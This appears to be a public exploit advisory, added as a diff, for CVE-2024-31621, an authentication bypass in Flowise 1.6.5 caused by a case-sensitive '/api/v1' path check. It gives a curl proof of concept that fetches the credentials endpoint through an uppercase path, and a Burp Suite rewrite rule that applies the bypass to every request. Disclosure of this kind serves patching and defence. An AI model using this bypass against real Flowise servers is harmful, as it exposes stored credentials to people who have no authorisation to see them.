@@ -1,0 +1,30 @@
+# Exploit Title: Flowise 1.6.5 - Authentication Bypass
+# Date: 17-April-2024
+# Exploit Author: Maerifat Majeed
+# Vendor Homepage: https://flowiseai.com/
+# Software Link: https://github.com/FlowiseAI/Flowise/releases
+# Version: 1.6.5
+# Tested on: mac-os
+# CVE : CVE-2024-31621
+
+The flowise version <= 1.6.5 is vulnerable to authentication bypass
+vulnerability.
+The code snippet
+
+this.app.use((req, res, next) => {
+>                 if (req.url.includes('/api/v1/')) {
+>                     whitelistURLs.some((url) => req.url.includes(url)) ?
+> next() : basicAuthMiddleware(req, res, next)
+>                 } else next()
+>             })
+
+
+puts authentication middleware for all the endpoints with path /api/v1
+except a few whitelisted endpoints. But the code does check for the case
+sensitivity hence only checks for lowercase /api/v1 . Anyone modifying the
+endpoints to uppercase like /API/V1 can bypass the authentication.
+
+*POC:*
+curl http://localhost:3000/Api/v1/credentials
+For seamless authentication bypass. Use burpsuite feature Match and replace
+rules in proxy settings. Add rule Request first line api/v1 ==> API/V1
